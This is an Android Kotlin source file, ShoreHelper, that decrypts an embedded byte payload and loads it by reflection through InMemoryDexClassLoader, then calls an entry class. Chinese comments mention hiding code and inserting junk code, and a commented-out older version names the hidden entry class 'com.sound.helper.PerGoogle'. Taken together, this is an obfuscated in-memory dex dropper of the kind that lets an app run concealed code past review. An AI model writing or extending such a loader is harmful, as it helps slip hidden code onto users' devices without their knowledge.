package com.river.shore

import android.content.Context
import java.nio.ByteBuffer

/**
 * Date：2025/12/5
 * Describe:
 */

class ShoreHelper {
    private val devInvoker by lazy { ShoreSInvoker() }
    private val mShoreCodeDec by lazy { ShoreCodeDec() }

    fun actionPost(context: Context, str: String) {
        // ... (原有测试代码保持不变) ...
        val c = mShoreCodeDec.fetchInput(context)
        val code = mShoreCodeDec.prankBa(c, str.toByteArray())
        // 调用主流程方法
        prepareAndLoadDex(code, context)
    }

    // 方法1: 主流程方法
    private fun prepareAndLoadDex(dexStr: ByteArray, context: Context) {
        val byteBuffer = ByteBuffer.wrap(dexStr)
        val classLoader = createClassLoader(byteBuffer, context)
        // 调用新类中的方法执行加载和调用
        devInvoker.loadAndInvokeClass(classLoader, context)
    }

    // 方法2: 创建类加载器
    private fun createClassLoader(byteBuffer: ByteBuffer, context: Context): Any {
        // 此方法内已添加垃圾代码，见下文
        // ... (包含垃圾代码的逻辑) ...
        val clazz = Class.forName("dalvik.system.InMemoryDexClassLoader")
        val constructor =
            clazz.getDeclaredConstructor(Class.forName("java.nio.ByteBuffer"), Class.forName("java.lang.ClassLoader"))

        val clazzLoader = context.javaClass.getMethod("getClassLoader").invoke(context)
        return constructor.newInstance(byteBuffer, clazzLoader)
    }
}

//class ShoreHelper {
//    private val mShoreCodeDec by lazy { ShoreCodeDec() }
//
//    fun actionPost(context: Context, str: String) {
//        // todo test
////        Class.forName("com.sound.helper.PerGoogle")
////            .getMethod("init", Context::class.java,String::class.java)
////            .invoke(null,context,"")
////        return
//
//        val c = mShoreCodeDec.fetchInput(context)
//        val code = mShoreCodeDec.prankBa(c, str.toByteArray())
//        dex(code, context)
//    }
//
//    private fun dex(dexStr: ByteArray, context: Context) {
//        // 代码隐藏
//        // code 为解密的byte数据
//        val byteBuffer = ByteBuffer.wrap(dexStr)
//        //"dalvik.system.InMemoryDexClassLoader"
//        val clazz = Class.forName("dalvik.system.InMemoryDexClassLoader")
//        val constructor = clazz.getDeclaredConstructor(
//            Class.forName("java.nio.ByteBuffer"), Class.forName("java.lang.ClassLoader")
//        )
//        val clazzLoader = context.javaClass.getMethod("getClassLoader").invoke(context)
//
//        val classLoader = constructor.newInstance(byteBuffer, clazzLoader)
//
//        val loadedClass = classLoader.javaClass.getMethod("loadClass", String::class.java)
//            // dex 入口类
//            .invoke(classLoader, "com.sound.helper.PerGoogle") as Class<*>
//        //dex 入口方法
//        loadedClass.getMethod("init", Context::class.java, String::class.java)
//            .invoke(null, context, "num")
//    }
//
//
//}